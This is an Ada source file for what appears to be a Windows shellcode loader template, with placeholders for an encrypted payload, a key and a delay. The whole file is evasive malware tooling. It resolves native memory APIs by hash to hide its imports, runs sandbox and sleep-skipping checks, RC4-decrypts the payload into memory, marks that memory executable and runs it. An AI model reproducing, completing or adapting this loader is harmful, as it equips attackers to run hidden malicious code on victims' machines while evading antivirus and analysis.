with Ada.Unchecked_Conversion;
with Interfaces;
with Interfaces.C;
with System;
with System.Storage_Elements;

procedure Loader is
   package C renames Interfaces.C;
   use type C.unsigned;
   use type C.int;
   use type C.long;
   use type C.size_t;
   use type System.Address;

   subtype U8 is Interfaces.Unsigned_8;
   type Buf_T is array (Positive range <>) of U8;
   type State_T is array (0 .. 255) of U8;

   function Get_Fn (MH : C.unsigned; FH : C.unsigned) return System.Address;
   pragma Import (C, Get_Fn, "resolve_api");

   function Check_Env (KH, H1, H2, H3 : C.unsigned) return C.int;
   pragma Import (C, Check_Env, "env_check");

   function Check_Time (KH, HT, HS : C.unsigned; MS : C.unsigned) return C.int;
   pragma Import (C, Check_Time, "time_gate");

   --  Module identifiers
   MH_N : constant C.unsigned := 16#NTDLL_HASH#;
   MH_K : constant C.unsigned := 16#KERNEL32_HASH#;

   --  Function identifiers
   FH_AV : constant C.unsigned := 16#NTALLOC_HASH#;
   FH_PV : constant C.unsigned := 16#NTPROTECT_HASH#;
   FH_SI : constant C.unsigned := 16#GSI_HASH#;
   FH_MS : constant C.unsigned := 16#GMS_HASH#;
   FH_TC : constant C.unsigned := 16#GTC_HASH#;
   FH_SL : constant C.unsigned := 16#SLP_HASH#;

   --  Memory management function types
   type Alloc_Fn is access function
     (PH   : System.Address;
      BA   : access System.Address;
      ZB   : C.size_t;
      RS   : access C.size_t;
      FL   : C.unsigned_long;
      PR   : C.unsigned_long) return C.long;
   pragma Convention (Stdcall, Alloc_Fn);

   type Protect_Fn is access function
     (PH   : System.Address;
      BA   : access System.Address;
      RS   : access C.size_t;
      NP   : C.unsigned_long;
      OP   : access C.unsigned_long) return C.long;
   pragma Convention (Stdcall, Protect_Fn);

   type Run_Fn is access procedure;
   pragma Convention (Stdcall, Run_Fn);

   function To_Alloc is new Ada.Unchecked_Conversion (System.Address, Alloc_Fn);
   function To_Protect is new Ada.Unchecked_Conversion (System.Address, Protect_Fn);
   function To_Run is new Ada.Unchecked_Conversion (System.Address, Run_Fn);

   type Byte_Ptr is access all U8;
   function To_Ptr is new Ada.Unchecked_Conversion (System.Address, Byte_Ptr);

   procedure Transform (S : in out State_T; K : Buf_T) is
      J   : Integer := 0;
      Tmp : U8;
   begin
      for I in S'Range loop
         S (I) := U8 (I);
      end loop;
      for I in S'Range loop
         J := (J + Integer (S (I)) +
               Integer (K ((I mod K'Length) + K'First))) mod 256;
         Tmp := S (I); S (I) := S (J); S (J) := Tmp;
      end loop;
   end Transform;

   procedure Apply (S : in out State_T; D : in out Buf_T) is
      II  : Integer := 0;
      JJ  : Integer := 0;
      Tmp : U8;
      KK  : U8;
      use Interfaces;
   begin
      for Pos in D'Range loop
         II := (II + 1) mod 256;
         JJ := (JJ + Integer (S (II))) mod 256;
         Tmp := S (II); S (II) := S (JJ); S (JJ) := Tmp;
         KK := S ((Integer (S (II)) + Integer (S (JJ))) mod 256);
         D (Pos) := D (Pos) xor KK;
      end loop;
   end Apply;

   CP : constant System.Address :=
     System.Storage_Elements.To_Address
       (System.Storage_Elements.Integer_Address'Last);

   Data : Buf_T := (
###DATA###
   );

   Key : constant Buf_T := (
###KEY###
   );

   P_Alloc   : Alloc_Fn;
   P_Protect : Protect_Fn;
   Base      : aliased System.Address := System.Null_Address;
   Region    : aliased C.size_t := C.size_t (Data'Length);
   Old_P     : aliased C.unsigned_long;
   Status    : C.long;
   St        : State_T;

begin
   if Check_Env (MH_K, FH_SI, FH_MS, FH_TC) = 0 then
      return;
   end if;

   if Check_Time (MH_K, FH_TC, FH_SL, ###DELAY###) = 0 then
      return;
   end if;

   P_Alloc := To_Alloc (Get_Fn (MH_N, FH_AV));
   P_Protect := To_Protect (Get_Fn (MH_N, FH_PV));

   if P_Alloc = null or P_Protect = null then
      return;
   end if;

   Transform (St, Key);
   Apply (St, Data);

   Status := P_Alloc.all (CP, Base'Access, 0, Region'Access,
                           16#3000#, 16#04#);
   if Status < 0 then
      return;
   end if;

   declare
      Dst : System.Address := Base;
      use System.Storage_Elements;
   begin
      for I in Data'Range loop
         To_Ptr (Dst).all := Data (I);
         Dst := Dst + 1;
      end loop;
   end;

   Region := C.size_t (Data'Length);
   Status := P_Protect.all (CP, Base'Access, Region'Access,
                             16#20#, Old_P'Access);
   if Status < 0 then
      return;
   end if;

   To_Run (Base).all;

end Loader;
